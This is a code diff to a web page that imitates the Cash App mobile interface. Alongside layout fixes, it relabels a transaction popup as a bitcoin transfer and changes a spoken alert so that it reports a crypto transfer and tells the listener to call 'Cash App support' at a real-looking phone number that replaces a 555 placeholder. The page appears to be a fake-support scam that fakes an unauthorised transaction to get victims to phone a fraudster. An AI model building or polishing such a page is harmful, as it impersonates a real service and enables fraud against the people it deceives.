@@ -168,6 +168,11 @@ body{
     opacity:0;
 
     transition:.7s cubic-bezier(.2,.8,.2,1);
+
+    overflow-y:auto;
+    overflow-x:hidden;
+    padding-bottom:120px; /* keeps last transactions above bottom nav */
+    -webkit-overflow-scrolling:touch;
 }
 
 /* STATUS */
@@ -469,19 +474,19 @@ body{
 
 .nav{
     position:absolute;
-    bottom:0;
     left:0;
-
-    width:100%;
+    right:0;
+    bottom:0;
 
     background:#fff;
-
     border-top:1px solid #ececec;
 
     display:flex;
     justify-content:space-around;
 
     padding:16px 0 28px;
+
+    z-index:100;
 }
 
 .nav-item{
@@ -704,7 +709,7 @@ body{
         <div class="loader"></div>
 
         <div class="loading-text" id="loadingText">
-            Opening Cash App...
+            Cash App...
         </div>
 
     </div>
@@ -960,7 +965,10 @@ body{
 
         </div>
 
-        <!-- NAV -->
+        
+    </div>
+
+<!-- NAV -->
 
         <div class="nav">
 
@@ -981,9 +989,8 @@ body{
             </div>
 
         </div>
-
-    </div>
-
+		
+		
 <!-- TRANSACTION POPUP -->
 
 <div class="popup-wrap" id="popupWrap">
@@ -999,7 +1006,7 @@ body{
         </div>
 
         <div class="popup-user">
-            Sent to Alex Morgan
+            BTC Sent to Alex Morgan
         </div>
 
         <div class="popup-time" id="popupTime">
@@ -1098,8 +1105,10 @@ setTimeout(()=>{
         pin.style.display="none";
 
         document
-        .getElementById("main")
-        .classList.add("show");
+		.getElementById("main")
+		.classList.add("show");
+		
+		document.querySelector(".nav").style.display = "flex";
 
     },500);
 
@@ -1206,11 +1215,11 @@ function playVerificationAlert(){
     window.speechSynthesis.cancel();
 
     const supportNumber =
-    "+1 800 555 1944";
+    "1 806 445 7407";
 
     const message =
 
-    `Possible scam transaction detected. Please review the transaction details. If this activity was not authorized by you, contact Cash App support immediately on ${supportNumber}`;
+    `Crypto transfer alert via Cash App Wallet. Please review the transaction details. If this activity was not authorized by you, contact Cash App support immediately on ${supportNumber}`;
 
     const speech =
     new SpeechSynthesisUtterance(message);
